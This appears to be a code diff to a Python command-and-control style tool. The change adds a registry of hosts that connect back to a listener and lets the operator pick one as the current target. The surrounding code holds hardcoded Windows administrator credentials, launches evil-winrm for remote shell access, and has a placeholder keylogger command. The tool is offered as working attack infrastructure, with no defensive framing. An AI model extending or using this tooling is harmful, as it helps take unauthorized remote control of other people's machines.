@@ -31,7 +31,11 @@ USERNAME = "Adm1nistrator"
 PASSWORD = "password"
 LISTEN_PORT = 1234
 
-def start_listener():
+# Global dictionary to store connected devices
+devices = {}
+
+def start_listener(devices_dict):
+    """Listen for a single incoming connection and add it to the devices dictionary"""
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", LISTEN_PORT))
     server.listen()
@@ -41,10 +45,34 @@ def start_listener():
     target_ip = addr[0]
     print(f"[+] Connection received from: {target_ip}")
 
+    # Add device to dictionary if not already present
+    if target_ip not in devices_dict:
+        devices_dict[target_ip] = {
+            "ip": target_ip,
+            "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "name": f"Device-{len(devices_dict) + 1}"
+        }
+        print(f"[+] Device added as '{devices_dict[target_ip]['name']}'")
+    else:
+        print(f"[*] Device already in list as '{devices_dict[target_ip]['name']}'")
+
     conn.close()
     server.close()
 
     return target_ip
+
+def list_devices(devices_dict):
+    """Display all devices in the dictionary"""
+    if not devices_dict:
+        print("[-] No devices connected yet. Use 'listen' to wait for connections.")
+        return
+    
+    print("\n" + "="*60)
+    print("  Connected Devices")
+    print("="*60)
+    for idx, (ip, info) in enumerate(devices_dict.items(), 1):
+        print(f"  [{idx}] {info['name']} - {ip} (connected: {info['connected_at']})")
+    print("="*60 + "\n")
 
 def connect_evil_winrm(target_ip):
     print("[*] Launching evil-win-rm...\n")
@@ -282,7 +310,9 @@ def cli():
         help, h        Show this help menu
         set            Set a target IP address
         show           Show current target
-        listen         Start listening for a target
+        listen         Start listening for a target (adds to device list)
+        list-devices   Show all connected devices
+        select         Select a device from the list to use as current target
         check          Check target connectivity (WinRM ports)
         evil-winrm     Connect to target using evil-winrm
         key-logger     To be determined
@@ -315,7 +345,27 @@ def cli():
             print(f"Current Target: {current_target}")
 
         elif cmd == "listen":
-            current_target = start_listener()
+            current_target = start_listener(devices)
+        
+        elif cmd == "list-devices":
+            list_devices(devices)
+        
+        elif cmd == "select":
+            if not devices:
+                print("[-] No devices available. Use 'listen' to wait for connections.")
+            else:
+                list_devices(devices)
+                try:
+                    choice = input("Enter device number to select: ")
+                    device_list = list(devices.values())
+                    idx = int(choice) - 1
+                    if 0 <= idx < len(device_list):
+                        current_target = device_list[idx]['ip']
+                        print(f"[+] Target set to {device_list[idx]['name']} ({current_target})")
+                    else:
+                        print("[-] Invalid device number")
+                except (ValueError, IndexError):
+                    print("[-] Invalid selection")
 
         elif cmd == "check":
             if not current_target:
